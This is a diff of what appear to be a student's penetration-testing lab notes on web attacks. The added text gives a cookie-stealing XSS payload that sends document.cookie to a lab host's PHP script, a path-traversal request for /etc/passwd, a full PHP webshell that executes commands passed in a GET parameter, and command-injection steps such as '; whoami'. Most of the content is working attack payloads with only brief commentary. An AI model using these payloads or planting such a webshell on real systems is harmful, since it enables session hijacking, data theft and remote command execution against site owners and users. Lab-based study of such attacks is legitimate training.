@@ -134,9 +134,37 @@ DAY2
             - upload cookiefile.txt
             - navigate back to original input field 
             - <script>document.location="http://10.50.22.27/uploads/cookies_stealer.php?username="+document.cookie;</script>
-                                         ^^ path to where ever your file uploads ^^     ^^ whatever Get variable was set as
-              
+                                         ^^ path to where ever your file uploads ^^     ^^ whatever GET variable was set as              
                               
+         
+    Server-Side Injection
+      view_image.php?file=../../../../../../etc/passwd ** can't have too many ../, over 15 then touch grass
+        - ideal situation: "file to read: " prompt
+         - view page source
+        - if successful, will display /etc/passwd and can see users to target
+        
+        
+        
+        Malicious File Upload (Webshell)
+        
+        - Can you upload? Yes (.php)
+        - Are file extensions being sanitized? No
+        - Can you access the uploads directory? Yes
+        
+    webshell.php:
+        <HTML><BODY>
+        <FORM METHOD="GET" NAME="myform" ACTION="">
+        <INPUT TYPE="text" NAME="cmd">
+     #  <INPUT TYPE="submit" VALUE="Send">
+        </FORM>
+     #  <pre>
+        <?php
+     #  if($_GET['cmd']) {
+          system($_GET['cmd']);
+          }
+        ?>
+     #  </pre>
+        </BODY></HTML>
     
-    
-    
+        - Go back to 10.50.34.125/cmdinjection/cmdinjectdemo.php
+        - try entering commands (must have a semicolon before command, i.e. ; whoami)
